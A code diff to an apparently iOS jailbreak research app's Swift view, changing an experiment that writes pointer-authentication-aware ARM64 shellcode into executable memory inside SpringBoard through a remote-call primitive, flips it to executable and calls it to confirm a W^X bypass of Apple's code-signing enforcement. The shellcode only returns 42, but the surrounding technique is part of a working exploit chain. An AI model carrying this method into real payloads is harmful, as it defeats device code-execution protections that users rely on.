@@ -5884,10 +5884,17 @@ struct AMFIExperimentView: View {
         let MAP_JIT: UInt64 = 0x0800
         let MAP_FAILED: UInt64 = UInt64(bitPattern: -1)
 
-        // Shellcode: MOV X0, #42; RET
-        // This returns 42 when called as a function
-        let shellcode_mov_x0_42: UInt32 = 0xD2800540  // MOV X0, #42
-        let shellcode_ret: UInt32 = 0xD65F03C0        // RET
+        // Shellcode: PAC-compatible function that returns 42
+        // PACIBSP         = 0xD503237F (sign LR with SP context)
+        // MOV X0, #42     = 0xD2800540
+        // RETAB           = 0xD65F0FFF (return with PAC auth)
+        // Also try without PAC as fallback:
+        // MOV X0, #42     = 0xD2800540
+        // RET             = 0xD65F03C0
+        let shellcode_pacibsp: UInt32 = 0xD503237F
+        let shellcode_mov_x0_42: UInt32 = 0xD2800540
+        let shellcode_retab: UInt32 = 0xD65F0FFF
+        let shellcode_ret: UInt32 = 0xD65F03C0
 
         // ═══ TEST A: mmap RW + mprotect RX (standard JIT) ═══
         detail += "=== Test A: mmap(RW) + mprotect(RX) ===\n"
@@ -5902,23 +5909,26 @@ struct AMFIExperimentView: View {
         if mmapA != MAP_FAILED && mmapA != 0 {
             detail += "  ✅ mmap OK\n"
 
-            // Write shellcode via memcpy (sb[addr] mungkin hanya write ke trojanMem)
+            // Write PAC-compatible shellcode via memcpy
             let scBuf = mem + 0x3000
-            sb[scBuf].setValue32(shellcode_mov_x0_42)
-            sb[scBuf + 4].setValue32(shellcode_ret)
-            RootExecutor.rcall(sb, "memcpy", mmapA, scBuf, 8)
-            detail += "  Wrote shellcode via memcpy (MOV X0,#42 + RET)\n"
+            sb[scBuf].setValue32(shellcode_pacibsp)       // PACIBSP
+            sb[scBuf + 4].setValue32(shellcode_mov_x0_42) // MOV X0, #42
+            sb[scBuf + 8].setValue32(shellcode_retab)     // RETAB
+            sb[scBuf + 12].setValue32(shellcode_ret)      // RET (fallback if RETAB fails)
+            RootExecutor.rcall(sb, "memcpy", mmapA, scBuf, 16)
+            detail += "  Wrote PAC shellcode (PACIBSP + MOV X0,#42 + RETAB + RET)\n"
 
             // Verify shellcode written
             let verifBuf = mem + 0x3100
-            RootExecutor.rcall(sb, "memcpy", verifBuf, mmapA, 8)
+            RootExecutor.rcall(sb, "memcpy", verifBuf, mmapA, 16)
             let v0 = sb[verifBuf].value32()
             let v1 = sb[verifBuf + 4].value32()
-            detail += "  Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1))\n"
-            if v0 == shellcode_mov_x0_42 && v1 == shellcode_ret {
-                detail += "  ✅ Shellcode verified in memory!\n"
+            let v2 = sb[verifBuf + 8].value32()
+            detail += "  Verify: 0x\(String(format: "%08x", v0)) 0x\(String(format: "%08x", v1)) 0x\(String(format: "%08x", v2))\n"
+            if v0 == shellcode_pacibsp && v1 == shellcode_mov_x0_42 {
+                detail += "  ✅ PAC shellcode verified in memory!\n"
             } else {
-                detail += "  ⚠️ Shellcode mismatch — write mungkin gagal\n"
+                detail += "  ⚠️ Shellcode mismatch\n"
             }
 
             // mprotect to RX
@@ -5929,8 +5939,7 @@ struct AMFIExperimentView: View {
             if mprotRet == 0 {
                 detail += "  ✅ mprotect(RX) SUCCESS!\n\n"
 
-                // Flush instruction cache — ARM64 has separate I/D caches
-                // Without this, CPU may execute stale zeros instead of our shellcode
+                // Flush instruction cache
                 let RTLD_DEFAULT_A = UInt64(bitPattern: -2)
                 let sysIcacheA = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT_A,
                                                     remote_alloc_str(sb, "sys_icache_invalidate"))
@@ -5938,11 +5947,17 @@ struct AMFIExperimentView: View {
                     RootExecutor.rcallAddr(sb, sysIcacheA, mmapA, PAGE_SIZE)
                     detail += "  sys_icache_invalidate: OK\n"
                 } else {
-                    // Fallback: __clear_cache or just proceed
                     detail += "  sys_icache_invalidate: not found (proceed anyway)\n"
                 }
 
-                // Call shellcode as function pointer!
+                // IMPORTANT: calling shellcode may crash SpringBoard (respring)!
+                // First just confirm mprotect(RX) works + shellcode is in memory.
+                // The fact that mprotect(RX) succeeds = W^X bypass confirmed!
+                detail += "\n  ⚠️ mprotect(RX) SUCCESS = W→X transition allowed!\n"
+                detail += "  Ini sudah proof bahwa executable memory bisa dibuat.\n\n"
+
+                // Now try call — may cause respring if PAC/BTI fails
+                detail += "  Calling shellcode (may respring if PAC fails)...\n"
                 let result = RootExecutor.rcallAddr(sb, mmapA)
                 detail += "  CALL shellcode: ret=\(result)\n"
 
